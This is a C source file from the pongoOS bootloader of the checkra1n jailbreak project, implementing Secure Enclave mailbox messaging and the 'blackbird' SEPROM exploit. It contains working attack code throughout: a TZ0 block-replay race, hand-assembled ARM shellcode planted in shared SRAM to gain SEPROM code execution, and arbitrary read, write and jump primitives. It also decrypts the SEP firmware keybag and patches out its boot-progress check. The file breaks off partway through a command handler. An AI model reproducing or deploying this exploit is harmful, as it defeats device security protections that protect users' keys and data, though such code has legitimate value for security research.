/* 
 * pongoOS - https://checkra.in
 * 
 * Copyright (C) 2019-2020 checkra1n team
 *
 * This file is part of pongoOS.
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 * 
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 * 
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 * 
 */
#include <pongo.h>

#define TZ_REGS ((volatile uint32_t*)0x200000480)

#define IRQ_T8015_SEP_INBOX_NOT_EMPTY 0x79
// #define SEP_DEBUG

struct mailbox_registers32 {
    volatile uint32_t dis_int; // 0x0
    volatile uint32_t en_int; // 0x4
    volatile uint32_t snd_sts; // 0x8
    volatile uint32_t _pad0; // 0xc
    volatile uint32_t snd0; // 0x10
    volatile uint32_t snd1; // 0x14
    volatile uint64_t _pad1; // 0x18
    volatile uint32_t recv_sts; // 0x20
    volatile uint64_t _pad2; // 0x28
    volatile uint64_t _pad3; // 0x30
    volatile uint32_t recv0; // 0x34
    volatile uint32_t recv1; // 0x38
};

struct mailbox_registers64 {
    volatile uint32_t dis_int;  // 8100
    volatile uint32_t en_int;   // 8104
    volatile uint32_t snd_sts;  // 8108
    volatile uint32_t recv_sts; // 810c
    volatile uint32_t pad[0x6f0/4];
    volatile uint64_t snd0;  // @0x8800
    volatile uint64_t snd1;
    volatile uint64_t _unk0; // @0x8810
    volatile uint64_t _unk1;
    volatile uint64_t _unk2; // @0x8820
    volatile uint64_t _unk3;
    volatile uint64_t recv0; // @0x8830
    volatile uint64_t recv1;
};

struct __attribute__((packed)) sep_message
{
    uint8_t ep;
    uint8_t tag;
    uint8_t opcode;
    uint8_t param;
    uint32_t data;
};

union sep_message_u {
    struct sep_message msg;
    uint64_t val;
};

static volatile struct mailbox_registers32 * mailboxregs32;
static volatile struct mailbox_registers64 * mailboxregs64;
static int is_sep64 = 0;
struct event sep_msg_event, sep_rand_event, sep_boot_event, sep_load_event, sep_panic_event, sep_done_tz0_event;
volatile uint32_t rnd_val;
volatile uint32_t sep_has_loaded, sep_has_booted, sep_has_panicked, sep_has_done_tz0, seprom_has_left_to_sepos;
void (*sepfw_kpf_hook)(void* sepfw_bytes, size_t sepfw_size);
void sepfw_kpf(void* sepfw_bytes, size_t sepfw_size) {
    uint32_t* insn_stream = sepfw_bytes;
    for (uint32_t i=0; i < sepfw_size/4; i++) {
        if (insn_stream[i] == 0xe1810200) {
            insn_stream[i] = 0xe3a00000;
#ifdef SEP_DEBUG
            fiprintf(stderr, "patched out bpr check\n");
#endif
            break;
        }
    }
}
volatile uint32_t* sep_reg;

static inline void mailbox_write(uint64_t value) {
#ifdef SEP_DEBUG
    union sep_message_u smg;
    smg.val = value;
    fiprintf(stderr, "AP->SEP: endpoint %x, tag: %x, opcode: %x, param: %x, data: %x\n", smg.msg.ep, smg.msg.tag, smg.msg.opcode, smg.msg.param, smg.msg.data);
#endif

    if (is_sep64) {
        mailboxregs64->snd0 = value;
        mailboxregs64->snd1 = 0;
    } else {
        mailboxregs32->snd0 = value & 0xffffffff;
        mailboxregs32->snd1 = (value >> 32ULL) & 0xffffffff;
    }
}
static inline uint64_t mailbox_read() {
    uint64_t rd;

    if (is_sep64) {
        rd = mailboxregs64->recv0;
        // XXX: we discard this for now, is that OK?
        (void)mailboxregs64->recv1;
    } else {
        rd = ((uint64_t)mailboxregs32->recv0) | (((uint64_t)mailboxregs32->recv1) << 32);
    }
#ifdef SEP_DEBUG
    if (!sep_has_panicked) {
        union sep_message_u smg;
        smg.val = rd;
        fiprintf(stderr, "SEP->AP: endpoint %x, tag: %x, opcode: %x, param: %x, data: %x\n", smg.msg.ep, smg.msg.tag, smg.msg.opcode, smg.msg.param, smg.msg.data);
    }
#endif
    return rd;
}
__attribute((__annotate__(("nofla")))) __attribute((__annotate__(("nobcf")))) __attribute((__annotate__(("nosub"))))  __attribute((__annotate__(("nocff"))))  __attribute((__annotate__(("nosplit")))) __attribute((__annotate__(("nostrcry")))) static inline void mailbox_write_fast(uint64_t value) {
    if (is_sep64) {
        mailboxregs64->snd0 = value;
        mailboxregs64->snd1 = 0;
    } else {
        mailboxregs32->snd0 = value & 0xffffffff;
        mailboxregs32->snd1 = (value >> 32ULL) & 0xffffffff;
    }
}
__attribute((__annotate__(("nofla")))) __attribute((__annotate__(("nobcf")))) __attribute((__annotate__(("nosub"))))  __attribute((__annotate__(("nocff"))))  __attribute((__annotate__(("nosplit")))) __attribute((__annotate__(("nostrcry")))) static inline uint64_t mailbox_read_fast() {
    uint64_t rd;

    if (is_sep64) {
        rd = mailboxregs64->recv0;
        // XXX: we discard this for now, is that OK?
        (void)mailboxregs64->recv1;
    } else {
        rd = ((uint64_t)mailboxregs32->recv0) | (((uint64_t)mailboxregs32->recv1) << 32);
    }
    return rd;
}
extern void sep_racer(void* observe_b0, void* observe_bs, void* null_b0, void* null_bs, void* replay, uint64_t size, void* shct, void* shv);
__attribute((__annotate__(("nofla")))) __attribute((__annotate__(("nobcf")))) __attribute((__annotate__(("nosub"))))  __attribute((__annotate__(("nocff"))))  __attribute((__annotate__(("nosplit")))) __attribute((__annotate__(("nostrcry")))) void  do_sep_racer(void* observe_b0, void* observe_bs, void* null_b0, void* null_bs, void* replay, uint64_t size, void* shct, void* shv, uint64_t msg) {
    disable_interrupts();
    mailbox_write_fast(msg);
    sep_racer(observe_b0, observe_bs, null_b0, null_bs, replay, size, shct, shv);
    enable_interrupts();
}

void sep_send_msg(uint8_t ep, uint8_t tag, uint8_t opcode, uint8_t param, uint32_t data) {
    union sep_message_u msg;
    msg.msg.ep = ep;
    msg.msg.tag = tag;
    msg.msg.opcode = opcode;
    msg.msg.param = param;
    msg.msg.data = data;
    mailbox_write(msg.val);
}
void seprom_execute_opcode(uint8_t operation, uint8_t param, uint32_t data) {
    sep_send_msg(255, 0x0, operation, param, data);
}

__attribute((__annotate__(("nofla")))) __attribute((__annotate__(("nobcf")))) __attribute((__annotate__(("nosub"))))  __attribute((__annotate__(("nocff"))))  __attribute((__annotate__(("nosplit")))) __attribute((__annotate__(("nostrcry")))) void sep_handle_msg_from_seprom(union sep_message_u msg) {
    if (msg.msg.opcode == 255) {
        fiprintf(stderr, "SEPROM panic!\n");
        sep_has_panicked = true;
        event_fire(&sep_panic_event);
    } else if (msg.msg.opcode == (16 + 100)) {
        // got random
        rnd_val = msg.msg.data;
        event_fire(&sep_rand_event);
    } else if (msg.msg.opcode == (5 + 100)) {
        sep_has_loaded = true;
        event_fire(&sep_load_event);
    } else if (msg.msg.opcode == (6 + 100)) {
        seprom_has_left_to_sepos = true;
    } else if (msg.msg.opcode == 0xd2) {
        sep_has_done_tz0 = true;
        event_fire(&sep_done_tz0_event);
    }
}

void sep_handle_ctrl_msg_from_sep(union sep_message_u msg) {
    if (msg.msg.opcode == 0xd) {
        fiprintf(stderr, "SEPOS booted!\n");
        sep_has_booted = true;
        event_fire(&sep_boot_event);
    }
}

uint8_t SEP_PANIC[400] = {0};
uint64_t * SEP_PANIC_PTR = (uint64_t*)&SEP_PANIC;
uint32_t SEP_PANIC_CNT = 0;

__attribute((__annotate__(("nofla")))) __attribute((__annotate__(("nobcf")))) __attribute((__annotate__(("nosub"))))  __attribute((__annotate__(("nocff"))))  __attribute((__annotate__(("nosplit")))) __attribute((__annotate__(("nostrcry")))) void sep_handle_msg_from_sep(union sep_message_u msg) {
    if (msg.msg.ep == 0xff) {
        // SEPROM
        sep_handle_msg_from_seprom(msg);
        if (!sep_has_panicked) {return;}
    } else if (msg.msg.ep == 0) {
        // SEPOS control msg
        return sep_handle_ctrl_msg_from_sep(msg);
    }

    if (sep_has_panicked) {
        if (socnum == 0x8960) {panic("SEPROM paniced; RIP");} // A7 has no panic logging (and iirc also sends no msgs, but I handle it here anyway)
        *SEP_PANIC_PTR = msg.val;
        SEP_PANIC_PTR++;
        SEP_PANIC_CNT += 8;
        if ((socnum < 0x8015 && SEP_PANIC_CNT == 64) || // till A10 they send 64 bytes
            (socnum == 0x8015 && SEP_PANIC_CNT == 400)) { // on A11 we seem to get 400
            void hexdump(void *mem, unsigned int len);
            hexdump(&SEP_PANIC,SEP_PANIC_CNT);
            panic("SEPROM paniced; RIP");
        }
    }

    // message from SEP

    // [tbd]
}
__attribute((__annotate__(("nofla")))) __attribute((__annotate__(("nobcf")))) __attribute((__annotate__(("nosub"))))  __attribute((__annotate__(("nocff"))))  __attribute((__annotate__(("nosplit")))) __attribute((__annotate__(("nostrcry")))) void sep_check_mailbox() {
    uint32_t sts = (is_sep64) ? mailboxregs64->recv_sts : mailboxregs32->recv_sts;
    if ((sts & 0x20000) == 0) {
        union sep_message_u msg;
        msg.val = mailbox_read();
        sep_handle_msg_from_sep(msg);
        event_fire(&sep_msg_event);
    }
}
__attribute((__annotate__(("nofla")))) __attribute((__annotate__(("nobcf")))) __attribute((__annotate__(("nosub"))))  __attribute((__annotate__(("nocff"))))  __attribute((__annotate__(("nosplit")))) __attribute((__annotate__(("nostrcry")))) uint64_t sep_fast_check_mailbox() {
    uint32_t sts = (is_sep64) ? mailboxregs64->recv_sts : mailboxregs32->recv_sts;
    if ((sts & 0x20000) == 0) {
        return mailbox_read_fast();
    }
    return 0;
}
void sep_irq() {
    while (1) {
        sep_check_mailbox();
        task_exit_irq();
    }
}
void seprom_ping() {
    disable_interrupts();
    seprom_execute_opcode(1, 0, 0);
    event_wait_asserted(&sep_msg_event);
}
void seprom_boot_tz0() {
    disable_interrupts();
    seprom_execute_opcode(5, 0, 0);
    event_wait_asserted(&sep_done_tz0_event);
}
void seprom_boot_tz0_async() {
    disable_interrupts();
    seprom_execute_opcode(5, 0, 0);
    enable_interrupts();
}
void seprom_load_sepos(void* firmware, char mode) {
    disable_interrupts();
    seprom_execute_opcode(6, mode, vatophys((uint64_t) (firmware)) >> 12);
    event_wait_asserted(&sep_msg_event);
}
void seprom_fwload() {
    uint32_t size;
    uint64_t *ptr = dt_get_prop("memory-map", "SEPFW", &size);
    seprom_load_sepos((void*)ptr[0],0);
}
asm(".globl _copy_block\n"
    "_copy_block:\n"
    "ldp x2, x3, [x1]\n"
    "stp x2, x3, [x0]\n"
    "ldp x4, x5, [x1, #0x10]\n"
    "stp x4, x5, [x0, #0x10]\n"
    "ldp x6, x7, [x1, #0x20]\n"
    "stp x6, x7, [x0, #0x20]\n"
    "dmb sy\n"
    "ret\n"
    );
uint32_t volatile* remote_addr;
uint32_t volatile* remote_data;
uint32_t volatile* remote_sts;
bool sep_is_pwned;
uint32_t sep_blackbird_read(uint32_t addr) {
    *remote_addr = addr;
    *remote_sts = 1;
    while (*remote_sts) {}
    return *remote_data;
}
void sep_blackbird_write(uint32_t addr, uint32_t val) {
    *remote_addr = addr;
    *remote_data = val;
    *remote_sts = 2;
    while (*remote_sts) {}
}
void sep_blackbird_jump(uint32_t addr, uint32_t r0) {
    *remote_addr = addr;
    *remote_data = r0;
    *remote_sts = 3;
    while (*remote_sts) {}
}
void sep_blackbird_jump_noreturn(uint32_t addr, uint32_t r0) {
    *remote_addr = addr;
    *remote_data = r0;
    *remote_sts = 3;
    __asm__ volatile("dsb sy");
    __asm__ volatile("isb");
}
bool is_waiting_to_boot;

void sep_blackbird_boot(uint32_t sepb) {
    return sep_blackbird_jump_noreturn(0, sepb);
}
static uint32_t sepbp;
void sep_boot_auto() {
    if (is_waiting_to_boot) {
        if(!sep_is_pwned) {
            fiprintf(stderr, "sep is not pwned!\n");
            return;
        }
        sep_blackbird_boot(sepbp);
        fiprintf(stderr, "kickstarted sep\n");
    }
    is_waiting_to_boot = 0;
    spin(2400); // wait for sep to come up
#ifndef DEV_BUILD
    // check if BPR is set
    uintptr_t bpr = 0;
    switch(socnum)
    {
        case 0x8010:
        case 0x8011:
            bpr = 0x2102d0030;
            break;
        case 0x8015:
            bpr = 0x2352d0030;
            break;
    }
    if(bpr && (*(volatile uint32_t*)bpr & 0x1))
    {
        panic("SEPOS patch failed - BPR is set :(");
    }
#endif
}
void sep_copy_block(uint32_t to, void* from) {
    volatile uint32_t* shmshc = (uint32_t*)0x210E00200;
    for (int i=0; i < 0x1000/4; i++) {
        shmshc[i] = ((uint32_t*)from)[i];
    }
    __asm__ volatile("dsb sy");
    *remote_addr = 0xd0e00200;
    *remote_data = to;
    __asm__ volatile("dsb sy");
    *remote_sts = 4;
    while (*remote_sts) {}

    for (int i=0; i < 0x1000/4; i++) {
        shmshc[i] = 0;
    }
}
void sep_copyout_block(void* to, uint32_t from) {
    volatile uint32_t* shmshc = (uint32_t*)0x210E00200;

    for (int i=0; i < 0x1000/4; i++) {
        shmshc[i] = 0;
    }

    *remote_addr = from;
    *remote_data = 0xd0e00200;
    *remote_sts = 4;
    while (*remote_sts) {}

    __asm__ volatile("dsb sy");
    for (int i=0; i < 0x1000/4; i++) {
        ((uint32_t*)to)[i] = shmshc[i];
    }

}
void sep_fault_block(uint32_t from) {
    *remote_addr = from;
    *remote_data = 0xd0e00200;
    *remote_sts = 4;
    while (*remote_sts) {}
}
static const DERItemSpec kbagSpecs[] = {
    { 0 * sizeof(DERItem), ASN1_INTEGER,                                0 },
    { 1 * sizeof(DERItem), ASN1_OCTET_STRING,                           0 },
    { 2 * sizeof(DERItem), ASN1_OCTET_STRING,                           0 },
};
void hexdump(void *mem, unsigned int len);
static void aes_cbc(void *key, void *iv, void *data, size_t size)
{
    int r = aes(AES_CBC | AES_DECRYPT | AES_256 | AES_USER_KEY, data, data, size, iv, key);
    if(r != 0)
    {
        panic("AES failed: %d", r);
    }
}

void copy_block(void* to, void* from);
void sep_aes_kbag(uint32_t* kbag_bytes_32, uint32_t * kbag_out, char mode);
void reload_sepi(TheImg4 *img4) {
    DERItem key;

    uint8_t kbag[0x30];

    if (Img4DecodeGetPayloadKeybag(img4, &key)) goto no_kbag;

    unsigned i, rv = 0;
    DERTag tag;
    DERSequence seq;
    DERDecodedInfo info;
    if (DERDecodeSeqInit(&key, &tag, &seq)) {
        goto no_kbag;
    }
    if (tag != ASN1_CONSTR_SEQUENCE) {
        goto no_kbag;
    }
    for (i = 0; !DERDecodeSeqNext(&seq, &info); i++) {
        DERItem items[3];
        if (info.tag != ASN1_CONSTR_SEQUENCE) {
            goto no_kbag;
        }
        if (DERParseSequenceContent(&info.content, 3, kbagSpecs, items, 3 * sizeof(DERItem))) {
            goto no_kbag;
        }
        if (items[1].length != 16 || items[2].length != 32) {
            goto no_kbag;
        }
        if (i < 2) {
            memcpy(kbag, items[1].data, 16);
            memcpy(kbag + 16, items[2].data, 32);
            break;
        }
    }
    if (i == 2) {
        rv = 0;
    }

    if (rv) goto no_kbag;
   /*
    fiprintf(stderr, "encrypted kbag: ");
    for (int i=0; i < 0x30; i++) {
        fiprintf(stderr, "%02X", kbag[i]);
    }
    fiprintf(stderr, "\n");
*/
    uint8_t decrypted_kbag[0x30];
    sep_aes_kbag((uint32_t*) kbag, (uint32_t*) decrypted_kbag, 0);
/*
    fiprintf(stderr, "decrypted kbag: ");
    for (int i=0; i < 0x30; i++) {
        fiprintf(stderr, "%02X", decrypted_kbag[i]);
    }
    fiprintf(stderr, "\n");
 */

    DERItem payload;
    if (Img4DecodeGetPayload(img4, &payload)) panic("no sepi payload");

    uint32_t page_aligned_size = payload.length + 0xfff;
    page_aligned_size &= ~0xfff;


    void* sepfw_bytes = alloc_contig(page_aligned_size);
    bzero(sepfw_bytes + payload.length, page_aligned_size - payload.length);
    sep_copyout_block(sepfw_bytes + page_aligned_size - 0x1000, page_aligned_size - 0x1000);

    memcpy(sepfw_bytes, payload.data, payload.length);
    aes_cbc(decrypted_kbag+0x10, decrypted_kbag, sepfw_bytes, payload.length);

    //hexdump(sepfw_bytes, 0x40);

    if (sepfw_kpf_hook)
        sepfw_kpf_hook(sepfw_bytes, payload.length);

    sepfw_kpf(sepfw_bytes, payload.length);

    uint8_t checkr[0x1000];
    for (size_t s=0; s < page_aligned_size; s+=0x1000) {
        while (1) {
            sep_copy_block((uint32_t)s, sepfw_bytes + s);
            sep_copyout_block(checkr, (uint32_t)s);
            if (memcmp(checkr, sepfw_bytes + s, 0x1000) == 0) {
                break;
            }
#ifdef SEP_DEBUG
            fiprintf(stderr, "detected corrupted write: %zx\n", s);
#endif
        }
    }
    uint32_t sepm[3];
    sepm[0] = sep_blackbird_read(sepbp + 0x4c);
    sepm[1] = sep_blackbird_read(sepbp + 0x50);
    sepm[2] = sep_blackbird_read(sepbp + 0x54);

    uint32_t sepm_off  = *(uint32_t*)(((uint64_t)(&sepm[0])) + 0x3);
    uint16_t sepm_sz  = *(uint16_t*)(((uint64_t)(&sepm[0])) + 0x3 + 4);

    page_aligned_size = sepm_sz + 0xfff;
    page_aligned_size &= ~0xfff;
    sep_copyout_block(sepfw_bytes + page_aligned_size - 0x1000, sepm_off + page_aligned_size - 0x1000);
    sep_copyout_block(sepfw_bytes + page_aligned_size - 0x1000, sepm_off + page_aligned_size - 0x1000);
    memcpy(sepfw_bytes, img4->manifestRaw.data, sepm_sz);

    for (size_t s=0; s < page_aligned_size; s+=0x1000) {
        while (1) {
            sep_copy_block(sepm_off + (uint32_t)s, sepfw_bytes + s);
            sep_copyout_block(checkr, sepm_off + (uint32_t)s);
            if (memcmp(checkr, sepfw_bytes + s, 0x1000) == 0) {
                break;
            }
#ifdef SEP_DEBUG
            fiprintf(stderr, "detected corrupted write: %zx\n", s);
#endif
        }
    }
    fiprintf(stderr, "SEP payload ready to boot\n");
    is_waiting_to_boot = 1;
    sep_boot_hook = sep_boot_auto;
    free_contig(sepfw_bytes, page_aligned_size);

    return;
no_kbag:
    panic("couldn't fetch kbag");
}


void seprom_fwload_race() {
    uint32_t volatile* shmshc = (uint32_t*)0x210E00000;
    
    if (shmshc[0] == 0xea000002) {
        *remote_addr = 0;
        *remote_sts = 1;
        spin(24000);
        if (*remote_sts == 0) {
            fiprintf(stderr, "previously pwned (maybe?)\n");
            sep_is_pwned = true;
            return;
        }
    }
    if (sep_is_pwned) {
        fiprintf(stderr, "already pwned!\n");
        return;
    }

    uint32_t size;
    uint64_t *ptr = dt_get_prop("memory-map", "SEPFW", &size);

    void* sep_image_buf = NULL;
    uint32_t imglen = (uint32_t)(ptr[1]);
    DERByte* data = (DERByte*) phystokv(*ptr);

    TheImg4 img4 = {0};
    unsigned int type = 0;
    int rv = Img4DecodeInit(data, imglen, &img4);
    if (0 != rv) goto badimage;
    rv = Img4DecodeGetPayloadType(&img4, &type);
    if (0 != rv) goto badimage;
    if (type != 0x73657069) goto badimage; // sepi

    // reassemble with im4r

    DERItem items[4];
    char IMG4[] = "IMG4";
    items[0].data = (DERByte *)IMG4;
    items[0].length = sizeof(IMG4) - 1;
    items[1].data = img4.payloadRaw.data;
    items[1].length = img4.payloadRaw.length;
    items[2].data = img4.manifestRaw.data;
    items[2].length = img4.manifestRaw.length;

    uint32_t bytesToInsert[0x30/4] = {0};
    memset(bytesToInsert, 0x41, 0x30);
    makeRestoreInfo(&items[3], (void*)bytesToInsert, 0x30);

    DERItem out;
    out.length = 0;
    Img4Encode(&out, items, 4);
    free(items[3].data);

    if (out.length == 0) panic("couldn't reassemble img4");
#ifdef SEP_DEBUG
    fiprintf(stderr, "image len %x -> %x\n", imglen, out.length);
#endif
    uint32_t sep_image_buf_len = out.length + 0x4000;
    sep_image_buf = alloc_contig(sep_image_buf_len);
    void* sep_image = (void*)((((uint64_t) sep_image_buf) + 0xfff) & (~0xfff));

    imglen = out.length;
    memcpy(sep_image, out.data, out.length);
    free(out.data);

    uint32_t victim_offset = 0;
    for (uint32_t sep_off=0; sep_off < out.length; sep_off += 0x20) {
        if (*(uint64_t*)(sep_image + sep_off) == 0x4141414141414141) {
#ifdef SEP_DEBUG
            fiprintf(stderr, "found victim block @ %x\n", sep_off);
#endif
            victim_offset = sep_off;
            break;
        }
    }

    if (!victim_offset) panic("our assumptions about asn1 are wrong");

    uint32_t range_size = victim_offset + 0x20;

    uint32_t* shc_chunk = (uint32_t*)(sep_image + victim_offset);
    shc_chunk[0] = 0xe51ff004;
    shc_chunk[1] = 0xd0e00000;

    cache_clean_and_invalidate(sep_image, range_size);

    void* replay_layout = malloc(range_size * 2);
    void* replay_shc = replay_layout + (victim_offset * 2);

    // prepare shc in aop sram

    int ct=0;
    shmshc[ct++] = 0xea000002; // b    0x10
    remote_addr = &shmshc[ct];
    shmshc[ct++] = 0; // addr
    remote_data = &shmshc[ct];
    shmshc[ct++] = 0xcafebabe; // data
    remote_sts = &shmshc[ct];
    shmshc[ct++] = 0x00000002; // sts
    volatile uint32_t* a0 = &shmshc[ct];
    shmshc[ct++] = 0; // a0
    shmshc[ct++] = 0; // a1
    shmshc[ct++] = 0xe50f0010; // str r0, [pc, #-0x10]
    shmshc[ct++] = 0xe50f1010; // str r1, [pc, #-0x10]
    shmshc[ct++] = 0xf57ff04f; // dsb sy
    shmshc[ct++] = 0xf57ff06f; // isb sy
    shmshc[ct++] = 0xe51f0024; // ldr r0, [pc, #-0x24]
    shmshc[ct++] = 0xe3500001; // cmp r0, #1
    shmshc[ct++] = 0x0a00000d; // beq 0x6c
    shmshc[ct++] = 0xe3500002; // cmp r0, #2
    shmshc[ct++] = 0x0a00000f; // beq 0x7c
    shmshc[ct++] = 0xe3500003; // cmp r0, #3
    shmshc[ct++] = 0x0a000011; // beq 0x8c
    shmshc[ct++] = 0xe3500004; // cmp r0, #4
    shmshc[ct++] = 0x0a00001f; // beq 0xcc
    shmshc[ct++] = 0xe3500005; // cmp r0, #5
    shmshc[ct++] = 0x0a000015; // beq 0xac
    shmshc[ct++] = 0xeafffff1; // b 0x20
    shmshc[ct++] = 0xf57ff04f; // dsb sy
    shmshc[ct++] = 0xf57ff06f; // isb sy
    shmshc[ct++] = 0xe3a00000; // mov r0, #0
    shmshc[ct++] = 0xe50f0060; // str r0, [pc, #-0x60]
    shmshc[ct++] = 0xeaffffec; // b 0x20
    shmshc[ct++] = 0xe51f0070; // ldr r0, [pc, #-0x70]
    shmshc[ct++] = 0xe5900000; // ldr r0, [r0]
    shmshc[ct++] = 0xe50f0074; // str r0, [pc, #-0x74]
    shmshc[ct++] = 0xeafffff6; // b 0x58
    shmshc[ct++] = 0xe51f0080; // ldr r0, [pc, #-0x80]
    shmshc[ct++] = 0xe51f1080; // ldr r1, [pc, #-0x80]
    shmshc[ct++] = 0xe5801000; // str r1, [r0]
    shmshc[ct++] = 0xeafffff2; // b 0x58
    shmshc[ct++] = 0xe51f1090; // ldr r1, [pc, #-0x90]
    shmshc[ct++] = 0xe51f0090; // ldr r0, [pc, #-0x90]
    shmshc[ct++] = 0xe3a02000; // mov r2, #0
    shmshc[ct++] = 0xf57ff04f; // dsb sy
    shmshc[ct++] = 0xee072f15; // mcr p15, #0x0, r2, c7, c5, #0x0
    shmshc[ct++] = 0xf57ff06f; // isb sy
    shmshc[ct++] = 0xe12fff31; // blx r1
    shmshc[ct++] = 0xeaffffea; // b 0x58
    shmshc[ct++] = 0xe51f10b0; // ldr r1, [pc, #-0xb0]
    shmshc[ct++] = 0xe51f00b0; // ldr r0, [pc, #-0xb0]
    shmshc[ct++] = 0xe3a02000; // mov r2, #0
    shmshc[ct++] = 0xf57ff04f; // dsb sy
    shmshc[ct++] = 0xee072f15; // mcr p15, #0x0, r2, c7, c5, #0x0
    shmshc[ct++] = 0xf57ff06f; // isb sy
    shmshc[ct++] = 0xe12fff12; // bx r2
    shmshc[ct++] = 0xeafffffe; // b 0xc8
    shmshc[ct++] = 0xe51f10d0; // ldr r1, [pc, #-0xd0]
    shmshc[ct++] = 0xe51f00d0; // ldr r0, [pc, #-0xd0]
    shmshc[ct++] = 0xe3a02a01; // mov r2, #4096
    shmshc[ct++] = 0xe3520000; // cmp r2, #0
    shmshc[ct++] = 0x0affffdd; // beq 0x58
    shmshc[ct++] = 0xe5913000; // ldr r3, [r1]
    shmshc[ct++] = 0xe5803000; // str r3, [r0]
    shmshc[ct++] = 0xe2811004; // add r1, r1, #4
    shmshc[ct++] = 0xe2800004; // add r0, r0, #4
    shmshc[ct++] = 0xe2422004; // sub r2, r2, #4
    shmshc[ct++] = 0xeafffff7; // b 0xd8

    uint32_t volatile* shared_value  = &shmshc[ct];
    uint32_t remote_shared_value_ptr = 0xd0e00000 + ct*4;
    shmshc[ct++] = 0;
    *remote_addr = remote_shared_value_ptr;


    volatile uint32_t *tz_regbase = TZ_REGS;
    uint32_t tz0_size = (((uint64_t)tz_regbase[1]) << 12)-(((uint64_t)tz_regbase[0]) << 12) + (1 << 12);
    uint64_t tz0_base = (((uint64_t)tz_regbase[0]) << 12);
    map_range(0xc00000000, 0x800000000 + tz0_base, tz0_size, 3, 2, true);

    if (!tz_blackbird()) goto out;

    tz_lockdown();

    seprom_ping();
    seprom_boot_tz0();
    seprom_ping();

    if (sep_has_panicked) {
        fiprintf(stderr, "sep race failed: seprom panic trying to blackbird\n");
        return;
    }

    void* image_victim = tz0_calculate_encrypted_block_addr(0);
    __unused void* tz0_shc = image_victim + (victim_offset * 2);

    memcpy(replay_layout, image_victim, range_size * 2);

    uint64_t b0[8], bs[8];
    copy_block(b0, replay_layout);
    copy_block(bs, replay_shc);

    union sep_message_u msg;
    msg.msg.ep = 255;
    msg.msg.tag = 0;
    msg.msg.opcode = 6;
    msg.msg.param = 0;
    msg.msg.data = vatophys((uint64_t)sep_image) >> 12ULL;
    wdt_disable();
    do_sep_racer(image_victim, tz0_shc, (void*)b0, (void*)bs, replay_layout, range_size*2, replay_shc, (void*)shared_value, msg.val);
    wdt_enable();

    if (sep_has_panicked) {
        fiprintf(stderr, "sep race failed: seprom panic\n");
    }
    if (sep_has_booted) {
        fiprintf(stderr, "sep race failed: sepos booted\n");
    }
    if (*shared_value == 0xcafebabe) {
        while(*remote_sts) {}
        sep_blackbird_write(remote_shared_value_ptr, 0x41414141);
        fiprintf(stderr, "successfully obtained SEPROM code execution\n");
        sepbp = *a0;
        sep_is_pwned = true;
#ifdef SEP_DEBUG
        fiprintf(stderr, "sepb @ %x\n",sepbp);
#endif
        uint32_t sepb_block_base = sepbp & (~0x1f);
        sepb_block_base <<= 1; // double it up to get the actual offset

        uint32_t off = range_size * 2 - 0x1000;
        if (sepb_block_base >= off && sepb_block_base < off + 0x1000) {
            memcpy(image_victim+sepb_block_base, replay_layout+sepb_block_base, 0x100); // write back the buffer
        } else panic("sepb block out of bounds, please try to swap more blocks");

        reload_sepi(&img4); // reload sepi that could have gotten corrupted

    } else {
        fiprintf(stderr, "SEPROM crashed\n");
    }
    goto out;

badimage:
    fiprintf(stderr, "please upload a valid sepi img4 to run this attack! (%x)\n", rv);

out:

    if (sep_image_buf)
        free_contig(sep_image_buf, sep_image_buf_len);
}

void seprom_load_art(void* art, char mode) {
    disable_interrupts();
    seprom_execute_opcode(6, mode, (vatophys((uint64_t)art)) >> 12);
    event_wait_asserted(&sep_msg_event);
}
void seprom_artload() {
    if (!loader_xfer_recv_count) {
        iprintf("please upload an ART before issuing this command\n");
        return;
    }
    seprom_load_art((void*)loader_xfer_recv_data, 0);
}
void seprom_resume() {
    disable_interrupts();
    seprom_execute_opcode(8, 0, 0);
    event_wait_asserted(&sep_msg_event);
}
void seprom_panic() {
    disable_interrupts();
    seprom_execute_opcode(10, 0, 0);
    event_wait_asserted(&sep_msg_event);
}
void seprom_rand() {
    disable_interrupts();
    seprom_execute_opcode(16, 0, 0);
    event_wait_asserted(&sep_rand_event);
    iprintf("got: %x\n", rnd_val);
}


struct sep_command {
    char* name;
    char* desc;
    void (*cb)(const char* cmd, char* args);
};

void sep_help();
#define SEP_COMMAND(_name, _desc, _cb) {.name = _name, .desc = _desc, .cb = _cb}
void sep_pwned_peek(const char* cmd, char* args) {
    if(!sep_is_pwned) {
        iprintf("sep is not pwned!\n");
        return;
    }

    if (! *args) {
        iprintf("sep peek usage: sep peek [addr]\n");
        return;
    }

    uint32_t addr = strtoul(args, NULL, 16);
    uint32_t rv = sep_blackbird_read((uint32_t)addr);
    iprintf("0x%x: %x (%x %x %x %x)\n", (uint32_t)addr, rv, rv&0xff, (rv>>8)&0xff, (rv>>16)&0xff, (rv>>24)&0xff);
}
void sep_pwned_poke(const char* cmd, char* args) {
    if(!sep_is_pwned) {
        iprintf("sep is not pwned!\n");
        return;
    }

    if (! *args) {
        iprintf("sep poke usage: sep poke [addr] [val32]\n");
        return;
    }
    char* arg1 = command_tokenize(args, 0x1ff - (args - cmd));
    if (!*arg1) {
        iprintf("sep poke usage: sep poke [addr] [val32]\n");
        return;
    }
    uint32_t addr = strtoul(args, NULL, 16);
    uint32_t value = strtoul(arg1, NULL, 16);
    iprintf("writing %x @ 0x%x\n", value, addr);
    sep_blackbird_write((uint32_t)addr, (uint32_t)value);
}
void sep_pwned_jump(const char* cmd, char* args) {
    if(!sep_is_pwned) {
        iprintf("sep is not pwned!\n");
        return;
    }

    if (! *args) {
        iprintf("sep jump usage: sep jump [addr] [r0]\n");
        return;
    }
